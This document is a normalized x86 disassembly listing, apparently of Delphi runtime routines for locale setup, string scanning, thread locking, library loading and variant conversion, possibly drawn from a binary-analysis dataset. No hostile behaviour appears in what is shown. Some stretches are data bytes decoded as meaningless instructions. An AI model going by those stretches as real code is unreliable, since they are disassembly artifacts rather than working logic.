test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4042f8
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c448
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c290
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4042f8
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c448
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c448
dec eax
mov ebx eax
sub_40c320
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c290
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4042f8
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c384
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4042f8
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c290
mov eax esi
call sub_4042f8
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4042f8
mov [ esp ] eax
jmp r-xdata
sub_40c40c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4044f8
add eax esi
dec eax
call sub_40c3e4
sub_40c448
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4044f8
add eax ebx
dec eax
call sub_40c3e4
add eax ebx
sub_40c484
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4044f8
push eax
mov eax esi
call sub_4044f8
mov ebp eax
mov eax ebp
pop edx
call sub_40c548
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c4bc
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407ff8
mov eax esi
call sub_4042f8
mov ebp eax
mov eax edi
mov edx ebp
call sub_404684
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404504
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404504
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404504
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c548
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408824
mov [ esp ] eax
mov eax ebp
call sub_408824
mov edi eax
mov edx ebp
mov eax esi
call sub_4089e8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c1f8
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4089e8
mov ebx eax
inc ebx
sub_40c5e8
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c610
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c610
test eax eax
jne r-xdata
sub_40c610
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4089d4
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c1f8
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4089d4
mov edi eax
test edi edi
jne r-xdata
sub_40c650
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c6b4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4042a8
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_40834c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c6bb
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_40c6c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c650
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c73c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c724
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c6c4
pop ecx
push ebp
call sub_40c6c4
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402e20
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c8b0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cb7b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c73c
call sub_40b0c0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b010
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_40834c
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_40834c
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b05c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b05c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_40834c
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b05c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b348
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b348
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_40408c
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b05c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b010
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b010
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_40408c
lea eax [ ebp - 0x8 ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_40834c
test eax eax
jne r-xdata
call sub_40b298
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040d0
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043b8
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043b8
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b05c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb82
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_40405c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_40834c
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b010
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_40834c
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4040d0
jmp r-xdata
sub_40cc30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40ccc0
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40afc4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ccc7
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_40cd18
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4087b0
mov [ rw-data ] eax
sub_40cd9c
push ebx
push esi
push edi
push ebp
call sub_403674
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_40278c
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4032d8
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_40ce04
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cdec
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ce8c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407e34
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cd8c
mov [ ebp ] eax
sub_40ce8c
push ebx
mov ebx eax
mov eax ebx
call sub_40cdec
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cd8c
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cecc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40cf40
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_40cfcc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4032e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_40cfcc
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cf88
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40ce04
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cd94
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cd74
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cd94
test eax eax
je r-xdata
mov eax edi
call sub_40cf88
test bl bl
je r-xdata
mov eax edi
call sub_40cfbc
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cd74
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cd80
sub_40d068
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce04
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cd94
mov eax ebx
call sub_40cfa0
mov eax ebx
call sub_40cf94
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce7c
sub_40d0b8
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40ce04
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cfac
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cd80
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cd74
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cfac
mov eax esi
call sub_40cfa0
sub_40d124
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce04
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce7c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cd74
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cfa0
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cfa0
sub_40d19c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d1c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d237
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405928
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d23e
lea eax [ ebp - 0x4 ]
call sub_405928
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_40339c
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d19c
test al al
jne r-xdata
mov al 0x1
sub_40d258
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d2ca
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d2ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4044f8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2b3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d49f
add [ eax ] al
add [ eax ] al
add ah dl
add [ edi ] eax
pushfd
jpo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004701 ] bh
jpo r-xdata
add [ eax ] al
add [ eax ] al
add al dl
add [ edi ] eax
test [ edx + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add ah cl
add [ edi ] eax
insb
jpo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x7d400047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffb8ff ] dh
jl r-xdata
add [ eax ] al
add [ eax ] al
add al cl
add [ edi ] eax
call sub_411c4c
add [ eax ] al
add ah al
add [ edi ] eax
cmp [ ebx + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
rol [ ecx ] 0x47
add [ eax + 0x477a ] bh
add [ eax ] al
add [ ecx + eax + 0x79500047 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x793c0047 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004701 ] dl
jge r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x7bcc0047 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004701 ] ch
jpe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d728
retn
mov eax rw-data
call sub_40d18c
call sub_40ccf8
call sub_40bf60
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40ba38 ]
call sub_404ac0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
call sub_404038
mov eax rw-data
mov edx [ r-xdata ]
call sub_40527c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40527c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404ac0
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_404718
mov eax rw-data
call sub_404038
jne r-xdata
add eax rw-data
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x7bc80047 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x78004701 ] cl
jge r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x79640047 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffb8ff ] ah
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d721
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x47 ] ah
add [ ebx + edi * 2 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] ah
inc edi
add [ edx + edi * 2 + 0x47 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x7de00047 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x4bffb8ff ] bl
jns r-xdata
sub_40d72c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d794
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d79b
retn
mov eax r-xdata
call sub_403de4
mov eax r-xdata
call sub_403e0c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bedc
call sub_40bfe0
call sub_40cd18
call sub_40c8b0
mov eax rw-data
mov edx r-xdata
call sub_40408c
sub_40d7cc
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d820
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d87a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408364
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d881
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40d88c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8e6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4096ec
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8ed
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40d8f8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d952
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4096c0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d959
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40d964
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d9be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
